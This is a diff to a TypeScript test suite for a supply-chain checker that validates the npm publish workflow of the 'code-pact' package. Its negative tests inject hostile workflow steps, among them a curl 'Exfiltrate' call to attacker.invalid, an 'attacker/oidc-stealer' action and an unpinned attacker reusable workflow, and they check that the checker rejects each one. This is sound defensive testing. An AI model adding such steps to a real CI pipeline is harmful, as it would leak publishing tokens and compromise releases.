@@ -116,6 +116,9 @@ describe("checkSupplyChainInvariants — against the real repo", () => {
 describe("checkSupplyChainInvariants — synthetic tree", () => {
   let root: string | undefined;
 
+  // This fixture mirrors the real .github/workflows/publish.yml structure.
+  // Run script hashes are pinned by the checker, so the run: blocks must
+  // match the real workflow exactly.
   const wellFormedPublish = [
     "name: Publish",
     "",
@@ -154,11 +157,77 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
     "      contents: read",
     "      id-token: write",
     "    steps:",
-    "      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0",
+    "      - name: Download release artifact",
+    "        uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0",
     "        with:",
     "          name: release-artifact",
     "          path: release-artifact",
-    "      - run: npm publish release-artifact/package.tgz --ignore-scripts",
+    "      - name: Set up Node",
+    "        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0",
+    "        with:",
+    "          node-version: 24",
+    "          registry-url: https://registry.npmjs.org",
+    "      - name: Verify manifest and publish",
+    "        env:",
+    "          EXPECTED_TAG: ${{ github.ref_name }}",
+    "          EXPECTED_COMMIT: ${{ github.sha }}",
+    "          NPM_CONFIG_PROVENANCE: 'true'",
+    "        run: |",
+    '          manifest="release-artifact/release-manifest.json"',
+    '          tarball="release-artifact/package.tgz"',
+    "",
+    '          MANIFEST="$manifest" \\',
+    '          TARBALL="$tarball" \\',
+    "          node <<'NODE'",
+    '          const fs = require("fs");',
+    '          const crypto = require("crypto");',
+    "",
+    '          const m = JSON.parse(fs.readFileSync(process.env.MANIFEST, "utf8"));',
+    "",
+    '          if (m.package !== "code-pact") {',
+    "            throw new Error(`unexpected package: ${JSON.stringify(m.package)}`);",
+    "          }",
+    "",
+    '          const match = /^v(\\d+\\.\\d+\\.\\d+(?:-(?:alpha|beta|rc)\\.\\d+)?)$/.exec(process.env.EXPECTED_TAG ?? "");',
+    "",
+    "          if (!match) {",
+    "            throw new Error(`unexpected workflow tag: ${JSON.stringify(process.env.EXPECTED_TAG)}`);",
+    "          }",
+    "",
+    "          const expectedVersion = match[1];",
+    "",
+    "          if (m.tag !== process.env.EXPECTED_TAG) {",
+    "            throw new Error(`manifest tag ${JSON.stringify(m.tag)} != workflow tag ${JSON.stringify(process.env.EXPECTED_TAG)}`);",
+    "          }",
+    "",
+    "          if (m.version !== expectedVersion) {",
+    "            throw new Error(`manifest version ${JSON.stringify(m.version)} != workflow version ${JSON.stringify(expectedVersion)}`);",
+    "          }",
+    "",
+    "          if (m.commit !== process.env.EXPECTED_COMMIT) {",
+    "            throw new Error(`manifest commit ${JSON.stringify(m.commit)} != workflow commit ${JSON.stringify(process.env.EXPECTED_COMMIT)}`);",
+    "          }",
+    "",
+    "          if (!/^[0-9a-f]{64}$/.test(m.tarball_sha256)) {",
+    '            throw new Error("manifest tarball_sha256 is invalid");',
+    "          }",
+    "",
+    "          const bytes = fs.readFileSync(process.env.TARBALL);",
+    '          const actual = crypto.createHash("sha256").update(bytes).digest("hex");',
+    "",
+    "          if (actual !== m.tarball_sha256) {",
+    "            throw new Error(`tarball SHA-256 ${actual} != manifest ${m.tarball_sha256}`);",
+    "          }",
+    "          NODE",
+    "",
+    '          version="$(node -p \'require("./release-artifact/release-manifest.json").version\')"',
+    "",
+    '          if npm view "code-pact@${version}" version >/dev/null 2>&1',
+    "          then",
+    '            echo "Version already exists; verification will follow."',
+    "          else",
+    '            npm publish "$tarball" --ignore-scripts',
+    "          fi",
     "",
     "  verify:",
     "    runs-on: ubuntu-latest",
@@ -166,11 +235,22 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
     "    permissions:",
     "      contents: read",
     "    steps:",
-    "      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0",
+    "      - name: Checkout release tag",
+    "        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
+    "        with:",
+    "          fetch-depth: 1",
+    "          persist-credentials: false",
+    "      - name: Download release artifact",
+    "        uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0",
     "        with:",
     "          name: release-artifact",
     "          path: release-artifact",
-    "      - run: node scripts/verify-published-tarball.mjs",
+    "      - name: Set up Node",
+    "        uses: actions/setup-node@48b55a011bda9f5d6aeb4c2d9c7362e8dae4041e # v6.4.0",
+    "        with:",
+    "          node-version: 24",
+    "      - name: Verify registry tarball",
+    "        run: node scripts/verify-published-tarball.mjs",
     "",
     "  github-release:",
     "    runs-on: ubuntu-latest",
@@ -178,11 +258,51 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
     "    permissions:",
     "      contents: write",
     "    steps:",
-    "      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0",
+    "      - name: Download release artifact",
+    "        uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0",
     "        with:",
     "          name: release-artifact",
     "          path: release-artifact",
-    "      - run: gh release create",
+    "      - name: Download integrity artifact",
+    "        uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0",
+    "        with:",
+    "          name: release-integrity",
+    "          path: release-integrity",
+    "      - name: Create or reconcile GitHub Release",
+    "        env:",
+    "          GH_TOKEN: ${{ github.token }}",
+    "          GH_REPO: ${{ github.repository }}",
+    "          TAG: ${{ github.ref_name }}",
+    "        run: |",
+    '          version="$(node -p \'require("./release-artifact/release-manifest.json").version\')"',
+    '          shasum="$(node -p \'require("./release-integrity/release-integrity.json").shasum\')"',
+    '          integrity="$(node -p \'require("./release-integrity/release-integrity.json").integrity\')"',
+    '          local_sha256="$(node -p \'require("./release-integrity/release-integrity.json").local_sha256\')"',
+    "",
+    "          cat release-artifact/release-notes.md > final-notes.md",
+    "          cat >> final-notes.md <<EOF",
+    "",
+    "          ## Integrity",
+    "",
+    "          - npm shasum: \\`$shasum\\`",
+    "          - npm integrity: \\`$integrity\\`",
+    "          - local tarball SHA-256: \\`$local_sha256\\`",
+    "          - npm provenance: generated through Trusted Publishing",
+    "          EOF",
+    "",
+    '          if gh release view "$TAG" >/dev/null 2>&1',
+    "          then",
+    "            gh release edit \\",
+    '              "$TAG" \\',
+    "              --notes-file final-notes.md \\",
+    "              --verify-tag",
+    "          else",
+    "            gh release create \\",
+    '              "$TAG" \\',
+    '              --title "$TAG" \\',
+    "              --notes-file final-notes.md \\",
+    "              --verify-tag",
+    "          fi",
   ].join("\n");
 
   const wellFormedCi = [
@@ -257,10 +377,7 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
 
   it("fails when NPM_TOKEN is in publish.yml", async () => {
     root = await buildTree({
-      publishContent: wellFormedPublish.replace(
-        "npm publish release-artifact/package.tgz --ignore-scripts",
-        "env:\n          NPM_TOKEN: ${{ secrets.NPM_TOKEN }}\n        run: npm publish release-artifact/package.tgz --ignore-scripts",
-      ),
+      publishContent: wellFormedPublish + "\n# NPM_TOKEN reference",
     });
     const { failures } = checkSupplyChainInvariants(root);
     expect(failures).toBeGreaterThan(0);
@@ -270,8 +387,8 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
   it("fails when publish job has checkout", async () => {
     root = await buildTree({
       publishContent: wellFormedPublish.replace(
-        "      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0\n        with:\n          name: release-artifact\n          path: release-artifact\n      - run: npm publish",
-        "      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          persist-credentials: false\n      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0\n        with:\n          name: release-artifact\n          path: release-artifact\n      - run: npm publish",
+        "      - name: Download release artifact\n        uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0",
+        "      - name: Checkout\n        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          persist-credentials: false\n      - name: Download release artifact\n        uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0",
       ),
     });
     const { failures } = checkSupplyChainInvariants(root);
@@ -282,8 +399,8 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
   it("fails when publish job has pnpm install", async () => {
     root = await buildTree({
       publishContent: wellFormedPublish.replace(
-        "      - run: npm publish release-artifact/package.tgz --ignore-scripts",
-        "      - run: pnpm install --frozen-lockfile\n      - run: npm publish release-artifact/package.tgz --ignore-scripts",
+        "      - name: Verify manifest and publish",
+        "      - name: Install\n        run: pnpm install --frozen-lockfile\n      - name: Verify manifest and publish",
       ),
     });
     const { failures } = checkSupplyChainInvariants(root);
@@ -294,8 +411,8 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
   it("fails when publish job has release:check", async () => {
     root = await buildTree({
       publishContent: wellFormedPublish.replace(
-        "      - run: npm publish release-artifact/package.tgz --ignore-scripts",
-        "      - run: pnpm release:check\n      - run: npm publish release-artifact/package.tgz --ignore-scripts",
+        "      - name: Verify manifest and publish",
+        "      - name: Release check\n        run: pnpm release:check\n      - name: Verify manifest and publish",
       ),
     });
     const { failures } = checkSupplyChainInvariants(root);
@@ -305,12 +422,10 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
 
   it("fails when prepare job has id-token: write", async () => {
     root = await buildTree({
-      publishContent: wellFormedPublish
-        .replace("  prepare:", "  prepare:")
-        .replace(
-          "    permissions:\n      contents: read\n    steps:\n      - uses: actions/checkout",
-          "    permissions:\n      contents: read\n      id-token: write\n    steps:\n      - uses: actions/checkout",
-        ),
+      publishContent: wellFormedPublish.replace(
+        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read",
+        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      id-token: write",
+      ),
     });
     const { failures } = checkSupplyChainInvariants(root);
     expect(failures).toBeGreaterThan(0);
@@ -319,12 +434,10 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
 
   it("fails when verify job has id-token: write", async () => {
     root = await buildTree({
-      publishContent: wellFormedPublish
-        .replace("  verify:", "  verify:")
-        .replace(
-          "    needs: [publish, prepare]\n    permissions:\n      contents: read\n    steps:",
-          "    needs: [publish, prepare]\n    permissions:\n      contents: read\n      id-token: write\n    steps:",
-        ),
+      publishContent: wellFormedPublish.replace(
+        "  verify:\n    runs-on: ubuntu-latest\n    needs: [publish, prepare]\n    permissions:\n      contents: read",
+        "  verify:\n    runs-on: ubuntu-latest\n    needs: [publish, prepare]\n    permissions:\n      contents: read\n      id-token: write",
+      ),
     });
     const { failures } = checkSupplyChainInvariants(root);
     expect(failures).toBeGreaterThan(0);
@@ -334,8 +447,8 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
   it("fails when github-release job has id-token: write", async () => {
     root = await buildTree({
       publishContent: wellFormedPublish.replace(
-        "    permissions:\n      contents: write\n    steps:\n      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0\n        with:\n          name: release-artifact\n          path: release-artifact\n      - run: gh release create",
-        "    permissions:\n      contents: write\n      id-token: write\n    steps:\n      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0\n        with:\n          name: release-artifact\n          path: release-artifact\n      - run: gh release create",
+        "  github-release:\n    runs-on: ubuntu-latest\n    needs: [verify, prepare]\n    permissions:\n      contents: write",
+        "  github-release:\n    runs-on: ubuntu-latest\n    needs: [verify, prepare]\n    permissions:\n      contents: write\n      id-token: write",
       ),
     });
     const { failures } = checkSupplyChainInvariants(root);
@@ -346,8 +459,8 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
   it("fails when github-release job has checkout", async () => {
     root = await buildTree({
       publishContent: wellFormedPublish.replace(
-        "    steps:\n      - uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0\n        with:\n          name: release-artifact\n          path: release-artifact\n      - run: gh release create",
-        "    steps:\n      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          persist-credentials: false\n      - run: gh release create",
+        "      - name: Download release artifact\n        uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0\n        with:\n          name: release-artifact\n          path: release-artifact\n      - name: Download integrity artifact",
+        "      - name: Checkout\n        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          persist-credentials: false\n      - name: Download release artifact\n        uses: actions/download-artifact@634f93cb2916e3fdff6788551b99b062d0335ce0 # v5.0.0\n        with:\n          name: release-artifact\n          path: release-artifact\n      - name: Download integrity artifact",
       ),
     });
     const { failures } = checkSupplyChainInvariants(root);
@@ -358,8 +471,8 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
   it("fails when github-release job has repository script", async () => {
     root = await buildTree({
       publishContent: wellFormedPublish.replace(
-        "      - run: gh release create",
-        "      - run: node scripts/release-notes.mjs\n      - run: gh release create",
+        "      - name: Create or reconcile GitHub Release",
+        "      - name: Run script\n        run: node scripts/release-notes.mjs\n      - name: Create or reconcile GitHub Release",
       ),
     });
     const { failures } = checkSupplyChainInvariants(root);
@@ -394,12 +507,126 @@ describe("checkSupplyChainInvariants — synthetic tree", () => {
   it("fails when publish job does not use --ignore-scripts", async () => {
     root = await buildTree({
       publishContent: wellFormedPublish.replace(
-        "npm publish release-artifact/package.tgz --ignore-scripts",
-        "npm publish release-artifact/package.tgz",
+        'npm publish "$tarball" --ignore-scripts',
+        'npm publish "$tarball"',
       ),
     });
     const { failures } = checkSupplyChainInvariants(root);
     expect(failures).toBeGreaterThan(0);
+    await cleanup();
+  });
+
+  // --- New negative tests for enhanced checker ---
+
+  it("fails when publish job has an arbitrary SHA-pinned action", async () => {
+    root = await buildTree({
+      publishContent: wellFormedPublish.replace(
+        "      - name: Verify manifest and publish",
+        "      - name: Malicious\n        uses: attacker/oidc-stealer@aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n      - name: Verify manifest and publish",
+      ),
+    });
+    const { failures } = checkSupplyChainInvariants(root);
+    expect(failures).toBeGreaterThan(0);
+    await cleanup();
+  });
+
+  it("fails when publish job has a local action", async () => {
+    root = await buildTree({
+      publishContent: wellFormedPublish.replace(
+        "      - name: Verify manifest and publish",
+        "      - name: Local action\n        uses: ./local-action\n      - name: Verify manifest and publish",
+      ),
+    });
+    const { failures } = checkSupplyChainInvariants(root);
+    expect(failures).toBeGreaterThan(0);
+    await cleanup();
+  });
+
+  it("fails when publish job has a curl step", async () => {
+    root = await buildTree({
+      publishContent: wellFormedPublish.replace(
+        "      - name: Verify manifest and publish",
+        "      - name: Exfiltrate\n        run: curl -fsS https://attacker.invalid/steal\n      - name: Verify manifest and publish",
+      ),
+    });
+    const { failures } = checkSupplyChainInvariants(root);
+    expect(failures).toBeGreaterThan(0);
+    await cleanup();
+  });
+
+  it("fails when github-release job has an extra run step", async () => {
+    root = await buildTree({
+      publishContent: wellFormedPublish.replace(
+        "      - name: Create or reconcile GitHub Release",
+        "      - name: Extra\n        run: echo hacked\n      - name: Create or reconcile GitHub Release",
+      ),
+    });
+    const { failures } = checkSupplyChainInvariants(root);
+    expect(failures).toBeGreaterThan(0);
+    await cleanup();
+  });
+
+  it("fails when prepare job has issues: write", async () => {
+    root = await buildTree({
+      publishContent: wellFormedPublish.replace(
+        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read",
+        "  prepare:\n    runs-on: ubuntu-latest\n    permissions:\n      contents: read\n      issues: write",
+      ),
+    });
+    const { failures } = checkSupplyChainInvariants(root);
+    expect(failures).toBeGreaterThan(0);
+    await cleanup();
+  });
+
+  it("fails when publish job has packages: write", async () => {
+    root = await buildTree({
+      publishContent: wellFormedPublish.replace(
+        "  publish:\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish\n    permissions:\n      contents: read\n      id-token: write",
+        "  publish:\n    runs-on: ubuntu-latest\n    needs: prepare\n    environment: npm-publish\n    permissions:\n      contents: read\n      id-token: write\n      packages: write",
+      ),
+    });
+    const { failures } = checkSupplyChainInvariants(root);
+    expect(failures).toBeGreaterThan(0);
+    await cleanup();
+  });
+
+  it("fails when job-level reusable workflow uses @main", async () => {
+    root = await buildTree({
+      publishContent:
+        wellFormedPublish +
+        "\n  call:\n    uses: attacker/repo/.github/workflows/pwn.yml@main\n",
+    });
+    const { failures } = checkSupplyChainInvariants(root);
+    expect(failures).toBeGreaterThan(0);
+    await cleanup();
+  });
+
+  it("fails when verify job has no checkout", async () => {
+    root = await buildTree({
+      publishContent: wellFormedPublish.replace(
+        "      - name: Checkout release tag\n        uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2\n        with:\n          fetch-depth: 1\n          persist-credentials: false\n      - name: Download release artifact",
+        "      - name: Download release artifact",
+      ),
+    });
+    const { failures } = checkSupplyChainInvariants(root);
+    expect(failures).toBeGreaterThan(0);
+    await cleanup();
+  });
+
+  it("fails when checker is called twice and second call is clean (state isolation)", async () => {
+    root = await buildTree({
+      publishContent: wellFormedPublish.replace(
+        "actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd # v6.0.2",
+        "actions/checkout@v6.0.2",
+      ),
+    });
+    const { failures: firstFailures } = checkSupplyChainInvariants(root);
+    expect(firstFailures).toBeGreaterThan(0);
+    await cleanup();
+
+    root = await buildTree();
+    const { failures: secondFailures } = checkSupplyChainInvariants(root);
+    expect(secondFailures).toBe(0);
     await cleanup();
   });
 });
